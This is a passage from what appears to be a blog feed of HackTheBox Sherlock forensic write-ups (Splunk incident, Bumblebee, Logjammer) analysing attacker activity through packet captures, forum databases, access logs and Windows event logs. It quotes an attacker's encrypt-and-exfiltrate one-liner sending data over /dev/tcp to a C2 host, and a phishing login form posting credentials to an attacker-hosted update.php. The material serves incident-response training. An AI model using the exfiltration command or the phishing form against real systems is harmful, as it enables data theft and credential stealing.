<p>But, I couldn&rsquo;t decrypt the <code>data.zip</code>. Something was not right as I completely ignored another hint from the commands ran by the TA. Before, exfiltrating the data the did some encoding to the data.zip file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo openssl enc -aes-256-cbc -iv <span style="color:#ff79c6">$(</span>cut -c 1-32 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>uname -r | md5sum<span style="color:#ff79c6">))</span> -K <span style="color:#ff79c6">$(</span>cut -c 1-64 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>date +%s | sha256sum<span style="color:#ff79c6">))</span> -in data.zip | base64 | dd <span style="color:#8be9fd;font-style:italic">conv</span><span style="color:#ff79c6">=</span>ebcdic &gt; /dev/tcp/192.168.222.130/8080
</span></span></code></pre></div><p>They first converted the encrypted data.zip file to <code>base64</code> and then used <code>dd conv=ebcdic</code> to convert the codec from <code>ASCII</code> to <code>EBCDIC</code>.</p>
<p>This time I exported the whole TCP stream in <code>EBCDIC</code> which reversed the <code>EBCDIC</code> conversion back to <code>ASCII</code>.
<img src="images/20240615181906.png" alt="alt text">
We can see the content is now in <code>base64</code> when I selected show data as <code>EBCDIC</code>.</p>
<p>Then, decoded the <code>base64</code> back to encrypted <code>data.zip</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ base64 -di data &gt; data.zip
</span></span></code></pre></div><p>Now we got the encrypted data.zip file. We can now successfully try to decrypt it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip -out data_dec.zip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ unzip data_dec.zip
</span></span><span style="display:flex;"><span>Archive:  data_dec.zip
</span></span><span style="display:flex;"><span>  inflating: Important.pdf
</span></span></code></pre></div><p>Found, the <code>Important.pdf</code>. And found the answer to Task 7.
<img src="images/20240615182506.png" alt="alt text"></p>
<p>For the Task 8, we can easily find the credential using Wireshark.
<img src="images/20240615182843.png" alt="alt text"></p>
<h3 id="summary">Summary</h3>
<p>In this Sherlock, the TA exploited the Splunk Server to run a malicious bash script embedded in XSLT file. The bash script contained a persistence mechanism to add a new user onto the system and to the sudo group. The TA also injected a public key to the newly created user <code>nginx</code>&rsquo;s <code>.ssh/authorized_keys</code> to access the backdoor account. After that the TA logged in as <code>nginx</code> and elevated their privileges to <code>root</code> using <code>su</code>. Then the TA moved an important file from <code>johnycage</code>&rsquo;s <code>Documents</code> directory and encrypted the file and exfiltrated the file to his own C2 server <code>192.168.222.130:8080</code>.</p>
]]></description></item><item><title>HTB Sherlock Bumblebee</title><link>https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/</link><pubDate>Sat, 15 Jun 2024 03:54:17 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/</guid><description><![CDATA[<h1 id="bumblebee-dfir">Bumblebee (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>bumblebee.zip</td>
<td>ba06e26779ead4b6299b6a188d11fc02</td>
<td>hackthebkue</td>
</tr>
<tr>
<td>incident.tgz</td>
<td>1b301c2fb2a1232758aca31588506edf</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li>SQLite Browser - For <code>phpbb.sqlite3</code> database analysis.</li>
<li>Linux Terminal - For <code>access.log</code> analysis.</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p><strong>Analyzing SQLite3 Database</strong></p>
<p>The contractor&rsquo;s user information are listed below.
<img src="images/20240613104708.png" alt="User Info"></p>
<p>The contractor&rsquo;s post information for the forum are listed below.
<img src="images/20240613105158.png" alt="Post Info"></p>
<p>Post contents malicious part</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">--snip--</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;main&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h3</span>&gt;Session Timeout&lt;/<span style="color:#ff79c6">h3</span>&gt; &lt;<span style="color:#ff79c6">br</span> /&gt; &lt;<span style="color:#ff79c6">br</span> /&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">p</span>&gt;Your session token has timed out in order to proceed you must login again.&lt;/<span style="color:#ff79c6">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://10.10.0.78/update.php&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">data-focus</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">target</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hiddenframe&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login-title&#34;</span>&gt;Login&lt;/<span style="color:#ff79c6">h2</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">fieldset</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fields1&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span>&gt;Username:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span>&gt;Password:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span> <span style="color:#50fa7b">autocomplete</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;off&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;4&#34;</span>&gt;Remember me&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;5&#34;</span>&gt;Hide my online status this session&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&amp;nbsp;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt; &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;6&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Login&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button1&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sethidden()&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/fieldset class=&#34;fields1&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">form</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span></code></pre></div><p>At this point we have identified the malicious IP <code>10.10.0.78</code>, and was used to access the forum as well as staging a credential stealer namely <code>update.php</code>.</p>
<p>Browsing the <code>phpbb_log</code> table we found additional information when the contractor logged in as Administrator. The real Administrator&rsquo;s IP was <code>10.255.254.2</code>. Upon Investigating the <code>access.log</code> artifact we can verify their information like User-Agent, which URLs were visited to get a sense of baseline activity which are normal for an Administrator user.</p>
<p>Then we can use those information against the threat actor to accurately paint a picture of the malicious activities that was done.</p>
<p><strong>Analyzing <code>access.log</code></strong></p>
<p>An access.log file can have a vast volume of data it is recommended to use Splunk or ElasticSearch or any kind of SIEM tool to quickly find and triage information. But, in our case we have relatively small amount of data and we can use basic Linux commands to filter and search for the information we are looking for.</p>
<p>Filtering the access.log file is very helpful to find the actual data we are looking for. For example, we don&rsquo;t need the data when a page loads and request are made to load CSS, images, assets to render the UI.</p>
<p>We can easily filter those types of requests using <code>egrep</code>. The command for filtering assets related data is given below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span>
</span></span></code></pre></div><p>Here <code>-v</code> returns everything except the matching pattern.</p>
<p>Let&rsquo;s search for the legit Administrator&rsquo;s User Agent information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.255.254.2 | head -n1
</span></span><span style="display:flex;"><span>10.255.254.2 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:08:42 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=12 HTTP/1.1&#34;</span> <span style="color:#bd93f9">403</span> <span style="color:#bd93f9">9412</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=1&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#34;</span>
</span></span></code></pre></div><p>Let&rsquo;s search for the adversary&rsquo;s User Agent information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | head -n1 
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:07:39 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">4205</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#34;</span>
</span></span></code></pre></div><p>The contractor added himself to the administrator group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep acp_groups | grep POST
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:53:51 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;g=5 HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2623</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;action=list&amp;g=5&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>The contractor also sent two requests to backup the database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span>download            
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:22 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2463</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&amp;i=acp_database&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:24 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3771</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:54:30 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2474</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:56:28 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">3770</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_database&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;mode=backup&amp;action=download&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>And finally they downloaded the database backup.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep .sql
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:12:01:38 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">34707</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>The database backup file size was <code>34707</code> bytes (34.7 KB) in size.</p>
<h3 id="summary">Summary</h3>
<p>The contractor used his account to stage a phishing page in the internal forum of Forela. Then he stole the Administrator&rsquo;s credential using the phishing page and exfiltrated the data using a credential stealer (httx://10.10.0.78/update.php) hosted on the IP <code>10.10.0.78</code>. Then, they used the stolen Administrator credential created an account (apoole) for persistence. Then they backed up and downloaded the database.</p>
]]></description></item><item><title>HTB Sherlock Logjammer</title><link>https://hshakilst.github.io/posts/htb-sherlocks/logjammer/</link><pubDate>Thu, 13 Jun 2024 04:39:51 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/logjammer/</guid><description><![CDATA[<h1 id="lologjammer---dfir">LoLogjammer - DFIR</h1>
<h3 id="scenario">Scenario</h3>
<p>You have been presented with the opportunity to work as a junior DFIR consultant for a big consultancy. However, they have provided a technical assessment for you to complete. The consultancy Forela-Security would like to gauge your Windows Event Log Analysis knowledge. We believe the Cyberjunkie user logged in to his computer and may have taken malicious actions. Please analyze the given event logs and report back.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Name</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>logjammer.zip</td>
<td>2ba794c406aee485186a959c840125af</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>Event-Logs/Powershell-Operational.evtx</td>
<td>6739802c74adc7bf6432dfcec853397c</td>
<td>n/a</td>
</tr>
<tr>
<td>Event-Logs/Security.evtx</td>
<td>5b75f867d2107d04721ccaeea7914cfd</td>
<td>n/a</td>
</tr>
<tr>
<td>Event-Logs/System.evtx</td>
<td>34b0d7a505c880a8ae78405d581b2b1a</td>
<td>n/a</td>
</tr>
<tr>
<td>Event-Logs/Windows Defender-Operational.evtx</td>
<td>a2f06faad866ac054705643b0e2c2364</td>
<td>n/a</td>
</tr>
<tr>
<td>Event-Logs/Windows Firewall-Firewall.evtx</td>
<td>7ff34616822baa259a8179ed3677173a</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li><a href="https://github.com/omerbenamram/EVTX">evtx_dump</a>: For dumping the evtx file.</li>
<li><code>jq</code>: For querying the dumped JSON files.</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p>Let&rsquo;s dump the evtx file to JSON, after that we can determine if we should use any SIEM tool for analysis for the Linux command line will be sufficient based on the volume of the data.</p>
<p>To dump the evtx file to JSON we can use <code>evtx-dump</code>. Here are some resources for finding Windows Event Log&rsquo;s Event IDs, Event Names, Event Description, etc. - [[Windows Event Logs]].</p>
<p>Dump .evtx to JSONL</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ evtx_dump -f <span style="color:#f1fa8c">&#39;Windows Firewall-Firewall.json&#39;</span> -o jsonl Windows<span style="color:#f1fa8c">\ </span>Firewall-Firewall.evtx
</span></span></code></pre></div><p>Analyze the logs using Event ID and search the converted JSON files using <code>jq</code>. To make this operation easy we can concatenate all the converted json files to a single log file.</p>
<p>Looking for a user with username <code>CyberJunkie</code> for a user logon event (4624) would be like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==4624 and .Event.EventData.TargetUserName==&#34;CyberJunkie&#34;)&#39;</span> -c | wc -l
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span>
</span></span></code></pre></div><p>The user <code>CyberJunkie</code> logged in 4 times to the workstation that is compromised.</p>
<p>The user also modified the firewall setting and added a firewall rule <code>Metasploit C2 Bypass</code> to facilitate his C2 server communication. Here, Event ID 2004 for Event Source <code>Microsoft-Windows-Windows Firewall with Advanced Security</code> is logged when a rule has been added to the Windows Firewall exception list.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat all_events.json | jq <span style="color:#f1fa8c">&#39;select(.Event.System.EventID==2004 and .Event.EventData.ModifyingUser==&#34;S-1-5-21-3393683511-3463148672-371912004-1001&#34;) .Event.EventData.RuleName&#39;</span>       
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (LLMNR-UDP-Out)&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;File and Printer Sharing (LLMNR-UDP-In)&#34;</span>
